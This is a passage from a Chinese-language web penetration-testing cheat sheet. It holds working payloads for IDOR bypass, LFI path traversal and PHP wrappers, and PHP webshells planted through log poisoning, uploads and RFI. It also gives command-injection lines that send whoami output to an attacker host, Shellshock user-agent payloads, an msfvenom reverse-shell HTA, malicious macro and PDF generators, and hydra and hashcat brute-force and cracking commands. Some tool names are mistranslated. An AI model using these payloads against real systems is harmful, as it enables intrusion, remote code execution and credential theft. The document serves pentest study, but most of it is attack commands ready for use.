<h4 id="Json参数污染"><a href="#Json参数污染" class="headerlink" title="Json参数污染"></a>Json参数污染</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">POST /api/v1/messages<br>&#123;<span class="hljs-string">&quot;user_id&quot;</span>:&lt;You_user_id&gt;,<span class="hljs-string">&quot;user_id&quot;</span>:&lt;Anoher_User_id&gt;&#125; <br></code></pre></td></tr></table></figure>

<p>使用 JSON 对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">POST /api/v1/messages<br>&#123;<span class="hljs-string">&quot;user_id&quot;</span>:&#123;<span class="hljs-string">&quot;user_id&quot;</span>:&lt;Anoher_User_id&gt;&#125;&#125; <br></code></pre></td></tr></table></figure>

<p>带数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<span class="hljs-string">&quot;user_id&quot;</span>:<span class="hljs-number">001</span>&#125; #Unauthorized<br>&#123;<span class="hljs-string">&quot;user_id&quot;</span>:[<span class="hljs-number">001</span>]&#125; #Authorized<br></code></pre></td></tr></table></figure>

<h4 id="随机案例"><a href="#随机案例" class="headerlink" title="随机案例"></a>随机案例</h4><p>GET &#x2F;admin&#x2F;profile #未授权 GET &#x2F;ADMIN&#x2F;profile #授权</p>
<h3 id="UUIDv1"><a href="#UUIDv1" class="headerlink" title="UUIDv1"></a>UUIDv1</h3><p><code>https://caon.io/docs/exploitation/other/uuid/</code><br><code>https://github.com/felipecaon/uuidv1gen</code></p>
<h4 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h4><p>如果在 ruby 中则添加 .json</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">/user/<span class="hljs-number">1029</span> # Unauthorized<br>/user/<span class="hljs-number">1029.</span>json # Authorized<br></code></pre></td></tr></table></figure>

<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含 - LFI"></a>本地文件包含 - LFI</h2><h3 id="替换-绕过"><a href="#替换-绕过" class="headerlink" title="替换..&#x2F; - 绕过"></a>替换..&#x2F; - 绕过</h3><p>$语言 &#x3D; str_replace(‘..&#x2F;‘, ‘’, $_GET[‘文件’]);</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">/....<span class="hljs-comment">//....//....//....//etc/passwd  </span><br>..././..././..././..././etc/paswd  <br>....\/....\/....\/....\/etc/passwd <br></code></pre></td></tr></table></figure>

<h3 id="编码以及路径转换"><a href="#编码以及路径转换" class="headerlink" title="编码以及路径转换"></a>编码以及路径转换</h3><p>urlencode 和双 urlencode &#x2F;etc&#x2F;passwd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2f</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2f</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2f</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2f</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2f</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span><br></code></pre></td></tr></table></figure>

<h3 id="PHP-包装器"><a href="#PHP-包装器" class="headerlink" title="PHP 包装器"></a>PHP 包装器</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id  </span><br>expect:<span class="hljs-comment">//id  </span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php  </span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini</span><br></code></pre></td></tr></table></figure>

<h3 id="过滤-PHP"><a href="#过滤-PHP" class="headerlink" title="过滤 PHP"></a>过滤 PHP</h3><p>预定义路径<br>preg_match(‘&#x2F;^.&#x2F;okay&#x2F;.+$&#x2F;‘, $_GET[‘file’])</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./okay/../../../../etc/passwd<br></code></pre></td></tr></table></figure>

<h3 id="使用空字节绕过-PHP-扩展"><a href="#使用空字节绕过-PHP-扩展" class="headerlink" title="使用空字节绕过 PHP 扩展"></a>使用空字节绕过 PHP 扩展</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//site.com/index.php?file=/etc/passwd%00.php</span><br></code></pre></td></tr></table></figure>

<p>删除 .php</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//site.com/index.php?file=index.p.phphp</span><br></code></pre></td></tr></table></figure>

<h4 id="LFI-文件上传"><a href="#LFI-文件上传" class="headerlink" title="LFI + 文件上传"></a>LFI + 文件上传</h4><p>动图</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&#x27;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; ok.gif<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif</code><br>shell.gif -&gt; Zip<br>1-</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; ok.php &amp;&amp; zip wshell_zip.jpg ok.php<br></code></pre></td></tr></table></figure>
<p>2-</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&amp;cmd=id  </span><br>https:<span class="hljs-comment">//raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg </span><br></code></pre></td></tr></table></figure>

<h4 id="日志中毒"><a href="#日志中毒" class="headerlink" title="日志中毒"></a>日志中毒</h4><p>阿帕奇</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">nc ip <span class="hljs-number">80</span>  <br>&lt;?php <span class="hljs-title function_">system</span><span class="hljs-params">($_GET[‘cmd’])</span>; ?&gt;  <br></code></pre></td></tr></table></figure>
<p>或<br>1-</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -s http:<span class="hljs-comment">//ip/index.php -A &#x27;&lt;?php system($_GET[‘cmd’]); ?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>2-<br><code>http://ip/index.php?file=/var/log/apache2/access.log&amp;cmd=id</code><br>邮件发送</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">telnet ip <span class="hljs-number">23</span><br>MAIL FROM: email@gmail.com<br>RCPT TO: &lt;?php <span class="hljs-title function_">system</span><span class="hljs-params">($_GET[‘cmd’])</span>; ?&gt;  <br>http:<span class="hljs-comment">//ip/index.php?file=/var/mail/mail.log&amp;cmd=id</span><br></code></pre></td></tr></table></figure>

<p>SSH</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh \<span class="hljs-string">&#x27;&lt;?php system($_GET[&#x27;</span>cmd<span class="hljs-number">&#x27;</span>]);?&gt;<span class="hljs-string">&#x27;@ip  </span><br><span class="hljs-string">http://ip/index.php?file=/var/log/auth.log&amp;cmd=id</span><br></code></pre></td></tr></table></figure>

<p> PHP 会话</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//ip/index.php?file=&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;  </span><br>http:<span class="hljs-comment">//ip/index.php?file=/var/lib/php/sessions/sess_&lt;your_session&gt;&amp;cmd=id</span><br></code></pre></td></tr></table></figure>

<p>其他路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">/var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span>  <br>/var/<span class="hljs-built_in">log</span>/sshd.<span class="hljs-built_in">log</span>  <br>/var/<span class="hljs-built_in">log</span>/vsftpd.<span class="hljs-built_in">log</span>  <br>/proc/self/fd/<span class="hljs-number">0</span><span class="hljs-number">-50</span>  <br></code></pre></td></tr></table></figure>

<h3 id="模板-LFI-和目录遍历-Nuclei"><a href="#模板-LFI-和目录遍历-Nuclei" class="headerlink" title="模板 LFI 和目录遍历 - Nuclei"></a>模板 LFI 和目录遍历 - Nuclei</h3><p><code>https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml</code><br><code>https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml</code></p>
<h3 id="单词表"><a href="#单词表" class="headerlink" title="单词表"></a>单词表</h3><p>burp-parameter-names.txt - 用于参数模糊测试的单词列表<br><code>https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt</code></p>
<p>词表 LFI - Linux<br><code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code></p>
<p>单词列表 LFI - Windows<br><code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code></p>
<p>bypass_lfi.txt<br><code>https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt</code></p>
<p>中毒.txt<br><code>https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt</code></p>
<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含 (RFI)"></a>远程文件包含 (RFI)</h2><h3 id="RFI-到-Webshell，带有空字节以绕过图像扩展"><a href="#RFI-到-Webshell，带有空字节以绕过图像扩展" class="headerlink" title="RFI 到 Webshell，带有空字节以绕过图像扩展"></a>RFI 到 Webshell，带有空字节以绕过图像扩展</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt; evil.txt<br>python -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//site.com/menu.php?file=http://&lt;IP&gt;/evil.php%00.png</span><br></code></pre></td></tr></table></figure>

<h3 id="RFI-到带有-txt-的-Webshell"><a href="#RFI-到带有-txt-的-Webshell" class="headerlink" title="RFI 到带有 txt 的 Webshell"></a>RFI 到带有 txt 的 Webshell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&#x27;&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; evil.txt<br>python -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//site.com/menu.php?file=http://&lt;IP&gt;/evil.txt&amp;cmd=ipconfig</span><br></code></pre></td></tr></table></figure>

<h2 id="操作系统命令注入"><a href="#操作系统命令注入" class="headerlink" title="操作系统命令注入"></a>操作系统命令注入</h2><p>特殊字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">&amp; command<br>&amp;&amp; command<br>; command<br>command %<span class="hljs-number">0</span>A command<br>| command<br>|| command<br>`command`<br>$(command)<br></code></pre></td></tr></table></figure>

<p>带外 - OOB 漏洞利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">curl http:<span class="hljs-comment">//$(whoami).site.com/</span><br>curl http:<span class="hljs-comment">//`whoami`.site.com/</span><br>nslookup `whoami`.attacker-server.com &amp;<br>curl http:<span class="hljs-comment">//192.168.0.20/$(whoami)</span><br></code></pre></td></tr></table></figure>

<p>检查命令是否由PowerShell或CMD执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(dir <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> *`|echo CMD);&amp;&lt;<span class="hljs-meta"># rem #&gt;echo PowerShell</span><br></code></pre></td></tr></table></figure>

<h2 id="HTTP数据包头命令执行"><a href="#HTTP数据包头命令执行" class="headerlink" title="HTTP数据包头命令执行"></a>HTTP数据包头命令执行</h2><p>检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nikto -h &lt;IP&gt; -C all<br></code></pre></td></tr></table></figure>

<p>利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -A <span class="hljs-string">&quot;() &#123; ignored; &#125;; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c &#x27;whoami&#x27;&quot;</span> &lt;IP&gt;<br>curl -A <span class="hljs-string">&quot;() &#123; :; &#125;;echo ;/bin/bash -c &#x27;hostname&#x27;&quot;</span>  &lt;IP&gt;<br>curl -A <span class="hljs-string">&quot;() &#123; :; &#125;; /usr/bin/nslookup $(whoami).site.com&quot;</span> &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="WEB-DAV"><a href="#WEB-DAV" class="headerlink" title="WEB DAV"></a>WEB DAV</h2><p>连接到 WebDAV 服务器并将恶意文件发送到 shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cadaver http:<span class="hljs-comment">//&lt;IP&gt;/webdav</span><br>put &lt;shell.asp&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -u <span class="hljs-string">&quot;&lt;user&gt;:&lt;password&gt;&quot;</span> http:<span class="hljs-comment">//&lt;IP&gt;/webdav/shell.asp</span><br></code></pre></td></tr></table></figure>

<p><code>https://github.com/notroj/cadaver</code></p>
<h1 id="十一、客户端攻击"><a href="#十一、客户端攻击" class="headerlink" title="十一、客户端攻击"></a>十一、客户端攻击</h1><h2 id="HTA-攻击实战"><a href="#HTA-攻击实战" class="headerlink" title="HTA 攻击实战"></a>HTA 攻击实战</h2><p>获取网络浏览器名称、操作系统、设备类型<br><code>https://explore.whatismybrowser.com/useragents/parse/#parse-useragent</code></p>
<p>使用 msfvenom 创建恶意 .hta</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f hta-psh -o /var/www/html/evil.hta<br></code></pre></td></tr></table></figure>

<h2 id="Microsoft-Word-宏攻击"><a href="#Microsoft-Word-宏攻击" class="headerlink" title="Microsoft Word 宏攻击"></a>Microsoft Word 宏攻击</h2><p>使用 .doc 的 base64 在 powershell 中生成反向 shell 的恶意宏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python evil_macro.py -l &lt;ip&gt; -p &lt;port&gt; -o macro.txt<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/rodolfomarianocy/Evil-Macro/</code></p>
<h2 id="恶意的PDF"><a href="#恶意的PDF" class="headerlink" title="恶意的PDF"></a>恶意的PDF</h2><p>恶意 PDF 生成器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 malicious-pdf.py burp-collaborator-url<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/jonaslejon/malicious-pdf</code></p>
<p>邪恶pdf<br><code>https://github.com/superzerosec/evilpdf</code></p>
<h1 id="十五、密码攻击"><a href="#十五、密码攻击" class="headerlink" title="十五、密码攻击"></a>十五、密码攻击</h1><h2 id="生成单词列表"><a href="#生成单词列表" class="headerlink" title="生成单词列表"></a>生成单词列表</h2><h3 id="Cewl-自定义单词列表生成器"><a href="#Cewl-自定义单词列表生成器" class="headerlink" title="Cewl - 自定义单词列表生成器"></a>Cewl - 自定义单词列表生成器</h3><p>根据网站信息生成单词列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cewl &lt;domain&gt; -w wordlist.txt<br></code></pre></td></tr></table></figure>

<h3 id="Crunch-单词列表生成器"><a href="#Crunch-单词列表生成器" class="headerlink" title="Crunch - 单词列表生成器"></a>Crunch - 单词列表生成器</h3><p>字符翻译<br><code>@ = Lower case alpha characters</code><br><code>, = Upper case alpha characters</code><br><code>% = Numeric characters</code><br><code>^ = Special characters including space</code></p>
<p>用法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./crunch &lt;min-len&gt; &lt;max-len&gt; [charset]<br></code></pre></td></tr></table></figure>

<p>基本示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crunch <span class="hljs-number">9</span> <span class="hljs-number">9</span> -t ,@@@@^%%%<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crunch <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">0123456789</span>abcdef -o wordlist.txt<br></code></pre></td></tr></table></figure>

<h3 id="john-·-破解"><a href="#john-·-破解" class="headerlink" title="john · 破解"></a>john · 破解</h3><p>在规则模块 [List.Rules:Wordlist] 内的 &#x2F;etc&#x2F;john&#x2F;john.conf 文件中添加您想要的规则以修改您的单词列表<br>基本规则示例<code>$@$[1-2]$[0-9]$[0-9]$[0-9]</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">john --wordlist=wordlist.txt --rules --<span class="hljs-built_in">stdout</span> &gt; mutated.txt<br></code></pre></td></tr></table></figure>

<p><code>https://www.openwall.com/john/doc/RULES.shtml</code></p>
<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><h3 id="识别哈希类型"><a href="#识别哈希类型" class="headerlink" title="识别哈希类型"></a>识别哈希类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashid &lt;hash&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://www.tunnelsup.com/hash-analyzer/</code><br><code>https://hashes.com/en/tools/hash_identifier</code></p>
<h3 id="使用-2john-对不同文件类型进行哈希处理以进行破解"><a href="#使用-2john-对不同文件类型进行哈希处理以进行破解" class="headerlink" title="使用 2john 对不同文件类型进行哈希处理以进行破解"></a>使用 2john 对不同文件类型进行哈希处理以进行破解</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/ssh2john.c">ssh2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/rar2john.c">rar2john</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c">zip2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/keepass2john.c">keepass2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/office2john.c">办公室2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/pdf2john.c">pdf2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/pwsafe2john.c">密码安全2john</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/racf2john.c">racf2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/vncpcap2john.cpp">vncpcap2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/hccap2john.c">hccap2j约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/keychain2john.c">钥匙扣2约翰</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/piyushcse29/john-the-ripper/blob/master/src/mozilla2john.c">mozilla2john</a></li>
</ul>
<h3 id="密码管理器"><a href="#密码管理器" class="headerlink" title="密码管理器"></a>密码管理器</h3><p>搜索 KeePass 数据库文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br></code></pre></td></tr></table></figure>

<p>对 .kdbx 文件进行哈希处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">keepass2john Database.kdbx &gt; keepass.hash   <br></code></pre></td></tr></table></figure>

<p>查找 hashcat 的哈希模式 ID</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat --help | grep -i <span class="hljs-string">&quot;KeePass&quot;</span><br></code></pre></td></tr></table></figure>

<p>hashcat 破解密码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m <span class="hljs-number">13400</span> keepass.hash<br></code></pre></td></tr></table></figure>

<h2 id="暴力攻击"><a href="#暴力攻击" class="headerlink" title="暴力攻击"></a>暴力攻击</h2><h3 id="RDP-暴力破解-Hydra"><a href="#RDP-暴力破解-Hydra" class="headerlink" title="RDP 暴力破解 - Hydra"></a>RDP 暴力破解 - Hydra</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L /usr/share/wordlists/rockyou.txt t -p <span class="hljs-string">&quot;&lt;password&quot;</span> rdp:<span class="hljs-comment">//&lt;IP&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="RDP-暴力破解-Crowbar"><a href="#RDP-暴力破解-Crowbar" class="headerlink" title="RDP 暴力破解 - Crowbar"></a>RDP 暴力破解 - Crowbar</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crowbar -b rdp -s X.X.X.X/<span class="hljs-number">32</span> -u admin -C /usr/share/wordlists/rockyou.txt -n <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h3 id="SMB-暴力破解-Hydra"><a href="#SMB-暴力破解-Hydra" class="headerlink" title="SMB 暴力破解 - Hydra"></a>SMB 暴力破解 - Hydra</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt &lt;IP&gt; smb<br></code></pre></td></tr></table></figure>

<h3 id="SSH-暴力破解-Hydra"><a href="#SSH-暴力破解-Hydra" class="headerlink" title="SSH 暴力破解 - Hydra"></a>SSH 暴力破解 - Hydra</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt ssh:<span class="hljs-comment">//&lt;IP&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="HTTP-POST-登录表单暴力破解-Hydra"><a href="#HTTP-POST-登录表单暴力破解-Hydra" class="headerlink" title="HTTP POST 登录表单暴力破解 - Hydra"></a>HTTP POST 登录表单暴力破解 - Hydra</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;IP&gt; http-post-form <span class="hljs-string">&quot;/login.php:user=admin&amp;pass=^PASS^:Invalid Login&quot;</span> -vV -f<br></code></pre></td></tr></table></figure>

<h3 id="HTTP-GET-登录表单暴力破解-Hydra"><a href="#HTTP-GET-登录表单暴力破解-Hydra" class="headerlink" title="HTTP GET 登录表单暴力破解 - Hydra"></a>HTTP GET 登录表单暴力破解 - Hydra</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt -f &lt;IP&gt; http-get /login<br></code></pre></td></tr></table></figure>

<h1 id="十六、Windows-枚举和本地权限提升"><a href="#十六、Windows-枚举和本地权限提升" class="headerlink" title="十六、Windows 枚举和本地权限提升"></a>十六、Windows 枚举和本地权限提升</h1><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>枚举所有本地帐户</p>
